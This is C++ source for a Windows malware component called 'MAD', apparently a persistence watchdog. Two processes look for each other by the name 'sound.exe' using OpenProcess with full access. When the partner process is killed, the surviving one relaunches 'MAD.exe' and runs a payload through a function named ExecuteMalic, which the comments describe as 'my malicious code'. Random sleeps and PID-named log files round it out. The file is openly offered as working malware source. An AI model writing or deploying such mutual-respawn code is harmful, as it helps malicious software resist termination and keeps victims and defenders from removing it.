#include <windows.h>
#include <filesystem>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>


/*
MAD is short for Mutually Assured Destruction.
A case when two entities have armaggedon weaponry but choose not to attack.
Because if any party decides to attack the other, it assures the destruction of both entities.
*/


char path [255];
int dummy = GetModuleFileNameA(NULL, path, 255);
std::string DirectoryPath = std::filesystem::path(path).parent_path().string();



HANDLE GetProcessHandleByName_NotEqToPID(std::string exe_name, DWORD OtherPID)
{
    HANDLE hProcess = {0};
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry) == TRUE)
    {
        while (Process32Next(snapshot, &entry) == TRUE)
        {
            if (stricmp(entry.szExeFile, exe_name.c_str()) == 0)
            {  
                hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                if(GetProcessId(hProcess) == OtherPID) //if this pid is the same PID of the current executable, we don't want this handle, as we want the handle of the other executable having the same name
                {
                    CloseHandle(hProcess);
                    continue;
                }

                CloseHandle(snapshot);
                return hProcess;

            }
        }
    }

    return NULL;
}



void ExecuteMalic(std::string PathToPayload)
{
    //execute my malicious code

    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    CreateProcessA(NULL, const_cast<char*>(PathToPayload.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);

    Sleep(10000);
}


int main()
{

    //I have my PID
    //I have the other process's PID
    DWORD MyPID = GetCurrentProcessId();
    Sleep(600); //This sleep just to give the other process to spawn by the orchestrator
    srand(MyPID + time(0));
    Sleep(rand()%5000);
    HANDLE other_Process_Handle = GetProcessHandleByName_NotEqToPID("sound.exe", MyPID);    //Name of the malware executable

    std::string PathToMalware = DirectoryPath + "\\" + "MAD.exe";
    std::string PathToPayload = DirectoryPath + "\\" + "sound.exe";


    std::string OutputFilePath = DirectoryPath + "\\" + std::to_string(MyPID) + ".txt";


    std::ofstream myfile;
    myfile.open(OutputFilePath, std::fstream::out);
    myfile << MyPID <<std::endl;
    myfile.close();

    while(true)
    {

        myfile.open(OutputFilePath, std::fstream::app);
        myfile << "Inside the loop" <<std::endl;
        myfile.close();
        Sleep(rand()%5000);

        if (other_Process_Handle == NULL)
        {
            other_Process_Handle = GetProcessHandleByName_NotEqToPID("sound.exe", MyPID); //trying one more time
            if (other_Process_Handle == NULL) {break;}

            myfile.open(OutputFilePath, std::fstream::app);
            myfile << "FOUND IT!!" <<std::endl;
            myfile.close();
        }

        DWORD Proc_Stt;
        //WaitForSingleObject(other_Process_Handle, INFINITE);

        GetExitCodeProcess(other_Process_Handle, &Proc_Stt);

        myfile.open(OutputFilePath, std::fstream::app);
        myfile << "Checking the other alive process" <<std::endl;
        myfile.close();


        if(Proc_Stt != STILL_ACTIVE)   //if the other process terminated
        {
            STARTUPINFOA si;
            PROCESS_INFORMATION pi;
            ZeroMemory(&si, sizeof(si));
            si.cb = sizeof(si);
            ZeroMemory(&pi, sizeof(pi));
            CreateProcessA(NULL, const_cast<char*>(PathToMalware.c_str()), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
            CloseHandle(pi.hProcess);

            other_Process_Handle = NULL; //to allow for rescanning of the other process

            //execute my malicious code if the other process is killed
            ExecuteMalic(PathToPayload);
            //break;
        }
    }



    ExecuteMalic(PathToPayload);



    return 0;
}